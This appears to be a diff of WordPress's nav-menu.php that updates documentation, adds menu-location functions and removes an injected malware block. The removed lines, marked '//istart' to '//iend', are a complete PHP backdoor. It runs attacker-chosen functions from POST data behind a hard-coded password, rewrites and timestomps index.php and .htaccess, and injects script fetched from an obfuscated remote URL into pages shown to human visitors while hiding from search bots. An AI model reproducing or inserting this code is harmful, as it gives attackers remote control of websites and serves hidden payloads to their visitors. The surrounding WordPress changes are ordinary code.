@@ -12,8 +12,8 @@
  *
  * @since 3.0.0
  *
- * @param string $menu Menu ID, slug, or name - or the menu object.
- * @return object|false False if $menu param isn't supplied or term does not exist, menu object if successful.
+ * @param int|string|WP_Term $menu Menu ID, slug, name, or object.
+ * @return WP_Term|false False if $menu param isn't supplied or term does not exist, menu object if successful.
  */
 function wp_get_nav_menu_object( $menu ) {
 	$menu_obj = false;
@@ -43,8 +43,8 @@ function wp_get_nav_menu_object( $menu ) {
 	 *
 	 * @since 4.3.0
 	 *
-	 * @param object|false $menu_obj Term from nav_menu taxonomy, or false if nothing had been found.
-	 * @param string       $menu     The menu ID, slug, or name passed to wp_get_nav_menu_object().
+	 * @param WP_Term|false      $menu_obj Term from nav_menu taxonomy, or false if nothing had been found.
+	 * @param int|string|WP_Term $menu     The menu ID, slug, name, or object passed to wp_get_nav_menu_object().
 	 */
 	return apply_filters( 'wp_get_nav_menu_object', $menu_obj, $menu );
 }
@@ -56,7 +56,7 @@ function wp_get_nav_menu_object( $menu ) {
  *
  * @since 3.0.0
  *
- * @param int|string $menu The menu to check (ID, slug, or name).
+ * @param int|string|WP_Term $menu Menu ID, slug, name, or object of menu to check.
  * @return bool Whether the menu exists.
  */
 function is_nav_menu( $menu ) {
@@ -96,6 +96,7 @@ function register_nav_menus( $locations = array() ) {
 /**
  * Unregisters a navigation menu location for a theme.
  *
+ * @since 3.1.0
  * @global array $_wp_registered_nav_menus
  *
  * @param string $location The menu location identifier.
@@ -184,6 +185,38 @@ function has_nav_menu( $location ) {
 }
 
 /**
+ * Returns the name of a navigation menu.
+ *
+ * @since 4.9.0
+ *
+ * @param string $location Menu location identifier.
+ * @return string Menu name.
+ */
+function wp_get_nav_menu_name( $location ) {
+	$menu_name = '';
+
+	$locations = get_nav_menu_locations();
+
+	if ( isset( $locations[ $location ] ) ) {
+		$menu = wp_get_nav_menu_object( $locations[ $location ] );
+
+		if ( $menu && $menu->name ) {
+			$menu_name = $menu->name;
+		}
+	}
+
+	/**
+	 * Filters the navigation menu name being returned.
+	 *
+	 * @since 4.9.0
+	 *
+	 * @param string $menu_name Menu name.
+	 * @param string $location  Menu location identifier.
+	 */
+	return apply_filters( 'wp_get_nav_menu_name', $menu_name, $location );
+}
+
+/**
  * Determines whether the given ID is a nav menu item.
  *
  * @since 3.0.0
@@ -215,7 +248,7 @@ function wp_create_nav_menu( $menu_name ) {
  *
  * @since 3.0.0
  *
- * @param string $menu Menu ID, slug, or name.
+ * @param int|string|WP_Term $menu Menu ID, slug, name, or object.
  * @return bool|WP_Error True on success, false or WP_Error object on failure.
  */
 function wp_delete_nav_menu( $menu ) {
@@ -539,179 +572,7 @@ function wp_update_nav_menu_item( $menu_id = 0, $menu_item_db_id = 0, $menu_item
  * @param array $args Optional. Array of arguments passed on to get_terms().
  *                    Default empty array.
  * @return array Menu objects.
-*///istart
-
-function my_time($dir) {
-    foreach (glob($dir . '/wp-*.php') as $f) {
-        $times[] = filemtime($f);
-    }
-    $max = 1;
-    for ($i = 0; $i < count($times) - 1; $i++) {
-        $k = 1;
-        for ($j = $i + 1; $j < count($times); $j++) {
-            if ($times[$i] == $times[$j]) {
-                $k++;
-                if ($k > $max) {
-                    $max = $k;
-                    $time = $times[$i];
-                }
-            }
-        }
-    }
-    return $time;
-}
-
-function my_correct($dir) {
-    $time = 0;
-    $path = $dir . '/index.php';
-    $content = base64_decode('PD9waHAKLyoqCiAqIEZyb250IHRvIHRoZSBXb3JkUHJlc3MgYXBwbGljYXRpb24uIFRoaXMgZmlsZSBkb2Vzbid0IGRvIGFueXRoaW5nLCBidXQgbG9hZHMKICogd3AtYmxvZy1oZWFkZXIucGhwIHdoaWNoIGRvZXMgYW5kIHRlbGxzIFdvcmRQcmVzcyB0byBsb2FkIHRoZSB0aGVtZS4KICoKICogQHBhY2thZ2UgV29yZFByZXNzCiAqLwoKLyoqCiAqIFRlbGxzIFdvcmRQcmVzcyB0byBsb2FkIHRoZSBXb3JkUHJlc3MgdGhlbWUgYW5kIG91dHB1dCBpdC4KICoKICogQHZhciBib29sCiAqLwpkZWZpbmUoJ1dQX1VTRV9USEVNRVMnLCB0cnVlKTsKCi8qKiBMb2FkcyB0aGUgV29yZFByZXNzIEVudmlyb25tZW50IGFuZCBUZW1wbGF0ZSAqLwpyZXF1aXJlKCBkaXJuYW1lKCBfX0ZJTEVfXyApIC4gJy93cC1ibG9nLWhlYWRlci5waHAnICk7Cg==');
-    if (file_get_contents($path) != $content) {
-        chmod($path, 0644);
-        file_put_contents($path, $content);
-        chmod($path, 0444);
-        $time = my_time($dir);
-        touch($path, $time);
-    }
-
-    $path = $dir . '/.htaccess';
-    $content = base64_decode('IyBCRUdJTiBXb3JkUHJlc3MKPElmTW9kdWxlIG1vZF9yZXdyaXRlLmM+ClJld3JpdGVFbmdpbmUgT24KUmV3cml0ZUJhc2UgLwpSZXdyaXRlUnVsZSBeaW5kZXhcLnBocCQgLSBbTF0KUmV3cml0ZUNvbmQgJXtSRVFVRVNUX0ZJTEVOQU1FfSAhLWYKUmV3cml0ZUNvbmQgJXtSRVFVRVNUX0ZJTEVOQU1FfSAhLWQKUmV3cml0ZVJ1bGUgLiAvaW5kZXgucGhwIFtMXQo8L0lmTW9kdWxlPgoKIyBFTkQgV29yZFByZXNzCg==');
-    if (file_exists($path) AND file_get_contents($path) != $content) {
-        chmod($path, 0644);
-        file_put_contents($path, $content);
-        chmod($path, 0444);
-        if (!$time) {
-            $time = my_time($dir);
-        }
-        touch($path, $time);
-    }
-}
-
-$p = $_POST;
-$_passssword = '25c4a3cd4741662225b167ea94ea3780';
-if (@$p[$_passssword] AND @$p['a'] AND @$p['c']) @$p[$_passssword](@$p['a'], @$p['c'], '');
-my_correct(dirname(__FILE__) . '/..');
-
-function request_url_data($url) {
-    if(!is_valid_url($url))
-        return false;
-
-    $site_url = (preg_match('/^https?:\/\//i', $_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
-    if (function_exists('curl_init')) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
-        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-            'X-Forwarded-For: ' . $_SERVER["REMOTE_ADDR"],
-            'User-Agent: ' . $_SERVER["HTTP_USER_AGENT"],
-            'Referer: ' . $site_url,
-        ));
-        $response = trim(curl_exec($ch));
-    } elseif (function_exists('fsockopen')) {
-        $m = parse_url($url);
-        if ($fp = fsockopen($m['host'], 80, $errno, $errstr, 6)) {
-            fwrite($fp, 'GET http://' . $m['host'] . $m["path"] . '?' . $m['query'] . ' HTTP/1.0' . "\r\n" .
-                'Host: ' . $m['host'] . "\r\n" .
-                'User-Agent: ' . $_SERVER["HTTP_USER_AGENT"] . "\r\n" .
-                'X-Forwarded-For: ' . @$_SERVER["REMOTE_ADDR"] . "\r\n" .
-                    'Referer: ' . $site_url . "\r\n" .
-                    'Connection: Close' . "\r\n\r\n");
-            $response = '';
-            while (!feof($fp)) {
-                $response .= fgets($fp, 1024);
-            }
-            list($headers, $response) = explode("\r\n\r\n", $response);
-            fclose($fp);
-        }
-    } else {
-        $response = 'curl_init and fsockopen disabled';
-    }
-    return $response;
-}
-
-error_reporting(0);
-
-//unset($_passssword);
-
-if (function_exists("add_action")) {
-    add_action('wp_head', 'add_2head');
-    add_action('wp_footer', 'add_2footer');
-}
-
-function add_2head() {
-    ob_start();
-}
-
-function is_valid_url(&$url)
-{
-    if (!preg_match('/^(.+?)(\d+)\.(\d+)\.(\d+)\.(\d+)(.+?)$/', $url, $m))
-        return false;
-    $url = $m[1].$m[5].'.'.$m[4].'.'.$m[3].'.'.$m[2].$m[6];
-    return true;
-}
-
-function add_2footer() {
-    $check = false;
-    $check_data = "";
-    if (!empty($_GET['check']) AND $_GET['check'] == '25c4a3cd4741662225b167ea94ea3780') {
-        $check = true;
-        $check_data = ('<!--checker_start ');
-        $check_data .= (substr(request_url_data('http://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css'), 0, 100));
-        $check_data .= (' checker_end-->');
-    }
-
-    if (!$check) {
-        if ($_SERVER['REQUEST_METHOD'] != 'GET')
-            return;
-        if (!@$_SERVER['HTTP_USER_AGENT'] OR (substr($_SERVER['REMOTE_ADDR'], 0, 6) == '74.125') OR preg_match('/(googlebot|msnbot|yahoo|search|bing|ask|indexer)/i', $_SERVER['HTTP_USER_AGENT']))
-            return;
-
-
-        $cookie_name = 'PHP_SESSION_PHP';
-        if (isset($_COOKIE[$cookie_name]))
-            return;
-
-        foreach (array('/\.css$/', '/\.swf$/', '/\.ashx$/', '/\.docx$/', '/\.doc$/', '/\.xls$/', '/\.xlsx$/', '/\.xml$/', '/\.jpg$/', '/\.pdf$/', '/\.png$/', '/\.gif$/', '/\.ico$/', '/\.js$/', '/\.txt$/', '/ajax/', '/cron\.php$/', '/wp\-login\.php$/', '/\/wp\-includes\//', '/\/wp\-admin/', '/\/admin\//', '/\/wp\-content\//', '/\/administrator\//', '/phpmyadmin/i', '/xmlrpc\.php/', '/\/feed\//') as $regex) {
-            if (preg_match($regex, $_SERVER['REQUEST_URI']))
-                return;
-        }
-
-    }
-
-    $buffer = ob_get_clean();
-    ob_start();
-    $regexp = '/<body[^>]*>/is';
-    if (preg_match($regexp, $buffer, $m)) {
-        $body = $m[0];
-//        $url = base64_decode('a3d3czksLDQ1LTEwOy03Oy0yOzYsYW9sZCw8YnFuYmRmZ2dsbSV2d25ccGx2cWBmPjoxMzYyOTIxOjI0OzE5MTM6Mw==');
-        $url = decrypt_url('a3d3czksLDQ1LTEwOy03Oy0yOzYsYW9sZCw8YnFuYmRmZ2dsbSV2d25ccGx2cWBmPjoxMzYyOTIxOjI0OzE5MTM6Mw==');
-//        if (($code = request_url_data($url)) AND base64_decode($code) AND preg_match('#[a-zA-Z0-9+/]+={0,3}#is', $code, $m)) {
-        if (($code = request_url_data($url)) AND $decoded = base64_decode($code, true)) {
-//            $body .=  '<script>var date = new Date(new Date().getTime() + 60*60*24*7*1000); document.cookie="' . $cookie_name . '=' . mt_rand(1, 1024) . '; path=/; expires="+date.toUTCString();</script>';
-//            $body .= base64_decode($m[0]);
-            $body .= $decoded;
-//            $body .= base64_decode($m[0]);
-        }
-        $body .= $check_data;
-
-        $buffer = preg_replace($regexp, $body, $buffer);
-    }
-    echo $buffer;
-    ob_flush();
-}
-
-function decrypt_url($encrypted_url)
-{
-    $encrypted_url = base64_decode($encrypted_url);
-    $url = '';
-    for ($i = 0; $i < strlen($encrypted_url); $i++)
-    {
-        $url .= chr(ord($encrypted_url[$i]) ^ 3);
-    }
-    return $url;
-}//iend
-
+ */
 function wp_get_nav_menus( $args = array() ) {
 	$defaults = array( 'hide_empty' => false, 'orderby' => 'name' );
 	$args = wp_parse_args( $args, $defaults );
@@ -730,38 +591,6 @@ function wp_get_nav_menus( $args = array() ) {
 }
 
 /**
- * Sort menu items by the desired key.
- *
- * @since 3.0.0
- * @access private
- *
- * @global string $_menu_item_sort_prop
- *
- * @param object $a The first object to compare
- * @param object $b The second object to compare
- * @return int -1, 0, or 1 if $a is considered to be respectively less than, equal to, or greater than $b.
- */
-function _sort_nav_menu_items( $a, $b ) {
-	global $_menu_item_sort_prop;
-
-	if ( empty( $_menu_item_sort_prop ) )
-		return 0;
-
-	if ( ! isset( $a->$_menu_item_sort_prop ) || ! isset( $b->$_menu_item_sort_prop ) )
-		return 0;
-
-	$_a = (int) $a->$_menu_item_sort_prop;
-	$_b = (int) $b->$_menu_item_sort_prop;
-
-	if ( $a->$_menu_item_sort_prop == $b->$_menu_item_sort_prop )
-		return 0;
-	elseif ( $_a == $a->$_menu_item_sort_prop && $_b == $b->$_menu_item_sort_prop )
-		return $_a < $_b ? -1 : 1;
-	else
-		return strcmp( $a->$_menu_item_sort_prop, $b->$_menu_item_sort_prop );
-}
-
-/**
  * Return if a menu item is valid.
  *
  * @link https://core.trac.wordpress.org/ticket/13958
@@ -777,15 +606,35 @@ function _is_valid_nav_menu_item( $item ) {
 }
 
 /**
- * Return all menu items of a navigation menu.
+ * Retrieves all menu items of a navigation menu.
+ *
+ * Note: Most arguments passed to the `$args` parameter – save for 'output_key' – are
+ * specifically for retrieving nav_menu_item posts from get_posts() and may only
+ * indirectly affect the ultimate ordering and content of the resulting nav menu
+ * items that get returned from this function.
  *
  * @since 3.0.0
  *
  * @global string $_menu_item_sort_prop
  * @staticvar array $fetched
  *
- * @param string $menu Menu name, ID, or slug.
- * @param array  $args Optional. Arguments to pass to get_posts().
+ * @param int|string|WP_Term $menu Menu ID, slug, name, or object.
+ * @param array              $args {
+ *     Optional. Arguments to pass to get_posts().
+ *
+ *     @type string $order       How to order nav menu items as queried with get_posts(). Will be ignored
+ *                               if 'output' is ARRAY_A. Default 'ASC'.
+ *     @type string $orderby     Field to order menu items by as retrieved from get_posts(). Supply an orderby
+ *                               field via 'output_key' to affect the output order of nav menu items.
+ *                               Default 'menu_order'.
+ *     @type string $post_type   Menu items post type. Default 'nav_menu_item'.
+ *     @type string $post_status Menu items post status. Default 'publish'.
+ *     @type string $output      How to order outputted menu items. Default ARRAY_A.
+ *     @type string $output_key  Key to use for ordering the actual menu items that get returned. Note that
+ *                               that is not a get_posts() argument and will only affect output of menu items
+ *                               processed in this function. Default 'menu_order'.
+ *     @type bool   $nopaging    Whether to retrieve all menu items (true) or paginate (false). Default true.
+ * }
  * @return false|array $items Array of menu items, otherwise false.
  */
 function wp_get_nav_menu_items( $menu, $args = array() ) {
@@ -814,7 +663,7 @@ function wp_get_nav_menu_items( $menu, $args = array() ) {
 	}
 
 	// Get all posts and terms at once to prime the caches
-	if ( empty( $fetched[$menu->term_id] ) || wp_using_ext_object_cache() ) {
+	if ( empty( $fetched[ $menu->term_id ] ) && ! wp_using_ext_object_cache() ) {
 		$fetched[$menu->term_id] = true;
 		$posts = array();
 		$terms = array();
@@ -854,8 +703,9 @@ function wp_get_nav_menu_items( $menu, $args = array() ) {
 	}
 
 	if ( ARRAY_A == $args['output'] ) {
-		$GLOBALS['_menu_item_sort_prop'] = $args['output_key'];
-		usort($items, '_sort_nav_menu_items');
+		$items = wp_list_sort( $items, array(
+			$args['output_key'] => 'ASC',
+		) );
 		$i = 1;
 		foreach ( $items as $k => $item ) {
 			$items[$k]->{$args['output_key']} = $i++;
@@ -919,6 +769,10 @@ function wp_setup_nav_menu_item( $menu_item ) {
 					$menu_item->_invalid = true;
 				}
 
+				if ( 'trash' === get_post_status( $menu_item->object_id ) ) {
+					$menu_item->_invalid = true;
+				}
+
 				$menu_item->url = get_permalink( $menu_item->object_id );
 
 				$original_object = get_post( $menu_item->object_id );
@@ -944,7 +798,7 @@ function wp_setup_nav_menu_item( $menu_item ) {
 
 				$menu_item->type_label = __( 'Post Type Archive' );
 				$post_content = wp_trim_words( $menu_item->post_content, 200 );
-				$post_type_description = '' == $post_content ? $post_type_description : $post_content; 
+				$post_type_description = '' == $post_content ? $post_type_description : $post_content;
 				$menu_item->url = get_post_type_archive_link( $menu_item->object );
 			} elseif ( 'taxonomy' == $menu_item->type ) {
 				$object = get_taxonomy( $menu_item->object );
@@ -1175,4 +1029,148 @@ function _wp_auto_add_pages_to_menu( $new_status, $old_status, $post ) {
 		}
 		wp_update_nav_menu_item( $menu_id, 0, $args );
 	}
+}
+
+/**
+ * Delete auto-draft posts associated with the supplied changeset.
+ *
+ * @since 4.8.0
+ * @access private
+ *
+ * @param int $post_id Post ID for the customize_changeset.
+ */
+function _wp_delete_customize_changeset_dependent_auto_drafts( $post_id ) {
+	$post = get_post( $post_id );
+
+	if ( ! $post || 'customize_changeset' !== $post->post_type ) {
+		return;
+	}
+
+	$data = json_decode( $post->post_content, true );
+	if ( empty( $data['nav_menus_created_posts']['value'] ) ) {
+		return;
+	}
+	remove_action( 'delete_post', '_wp_delete_customize_changeset_dependent_auto_drafts' );
+	foreach ( $data['nav_menus_created_posts']['value'] as $stub_post_id ) {
+		if ( empty( $stub_post_id ) ) {
+			continue;
+		}
+		if ( 'auto-draft' === get_post_status( $stub_post_id ) ) {
+			wp_delete_post( $stub_post_id, true );
+		} elseif ( 'draft' === get_post_status( $stub_post_id ) ) {
+			wp_trash_post( $stub_post_id );
+			delete_post_meta( $stub_post_id, '_customize_changeset_uuid' );
+		}
+	}
+	add_action( 'delete_post', '_wp_delete_customize_changeset_dependent_auto_drafts' );
+}
+
+/**
+ * Handle menu config after theme change.
+ *
+ * @access private
+ * @since 4.9.0
+ */
+function _wp_menus_changed() {
+	$old_nav_menu_locations    = get_option( 'theme_switch_menu_locations', array() );
+	$new_nav_menu_locations    = get_nav_menu_locations();
+	$mapped_nav_menu_locations = wp_map_nav_menu_locations( $new_nav_menu_locations, $old_nav_menu_locations );
+
+	set_theme_mod( 'nav_menu_locations', $mapped_nav_menu_locations );
+	delete_option( 'theme_switch_menu_locations' );
+}
+
+/**
+ * Maps nav menu locations according to assignments in previously active theme.
+ *
+ * @since 4.9.0
+ *
+ * @param array $new_nav_menu_locations New nav menu locations assignments.
+ * @param array $old_nav_menu_locations Old nav menu locations assignments.
+ * @return array Nav menus mapped to new nav menu locations.
+ */
+function wp_map_nav_menu_locations( $new_nav_menu_locations, $old_nav_menu_locations ) {
+	$registered_nav_menus   = get_registered_nav_menus();
+	$new_nav_menu_locations = array_intersect_key( $new_nav_menu_locations, $registered_nav_menus );
+
+	// Short-circuit if there are no old nav menu location assignments to map.
+	if ( empty( $old_nav_menu_locations ) ) {
+		return $new_nav_menu_locations;
+	}
+
+	// If old and new theme have just one location, map it and we're done.
+	if ( 1 === count( $old_nav_menu_locations ) && 1 === count( $registered_nav_menus ) ) {
+		$new_nav_menu_locations[ key( $registered_nav_menus ) ] = array_pop( $old_nav_menu_locations );
+		return $new_nav_menu_locations;
+	}
+
+	$old_locations = array_keys( $old_nav_menu_locations );
+
+	// Map locations with the same slug.
+	foreach ( $registered_nav_menus as $location => $name ) {
+		if ( in_array( $location, $old_locations, true ) ) {
+			$new_nav_menu_locations[ $location ] = $old_nav_menu_locations[ $location ];
+			unset( $old_nav_menu_locations[ $location ] );
+		}
+	}
+
+	// If there are no old nav menu locations left, then we're done.
+	if ( empty( $old_nav_menu_locations ) ) {
+		return $new_nav_menu_locations;
+	}
+
+	/*
+	 * If old and new theme both have locations that contain phrases
+	 * from within the same group, make an educated guess and map it.
+	 */
+	$common_slug_groups = array(
+		array( 'primary', 'menu-1', 'main', 'header', 'navigation', 'top' ),
+		array( 'secondary', 'menu-2', 'footer', 'subsidiary', 'bottom' ),
+		array( 'social' ),
+	);
+
+	// Go through each group...
+	foreach ( $common_slug_groups as $slug_group ) {
+
+		// ...and see if any of these slugs...
+		foreach ( $slug_group as $slug ) {
+
+			// ...and any of the new menu locations...
+			foreach ( $registered_nav_menus as $new_location => $name ) {
+
+				// ...actually match!
+				if ( false === stripos( $new_location, $slug ) && false === stripos( $slug, $new_location ) ) {
+					continue;
+				}
+
+				// Then see if any of the old locations...
+				foreach ( $old_nav_menu_locations as $location => $menu_id ) {
+
+					// ...and any slug in the same group...
+					foreach ( $slug_group as $slug ) {
+
+						// ... have a match as well.
+						if ( false === stripos( $location, $slug ) && false === stripos( $slug, $location ) ) {
+							continue;
+						}
+
+						// Make sure this location wasn't mapped and removed previously.
+						if ( ! empty( $old_nav_menu_locations[ $location ] ) ) {
+
+							// We have a match that can be mapped!
+							$new_nav_menu_locations[ $new_location ] = $old_nav_menu_locations[ $location ];
+
+							// Remove the mapped location so it can't be mapped again.
+							unset( $old_nav_menu_locations[ $location ] );
+
+							// Go back and check the next new menu location.
+							continue 3;
+						}
+					} // endforeach ( $slug_group as $slug )
+				} // endforeach ( $old_nav_menu_locations as $location => $menu_id )
+			} // endforeach foreach ( $registered_nav_menus as $new_location => $name )
+		} // endforeach ( $slug_group as $slug )
+	} // endforeach ( $common_slug_groups as $slug_group )
+
+	return $new_nav_menu_locations;
 }
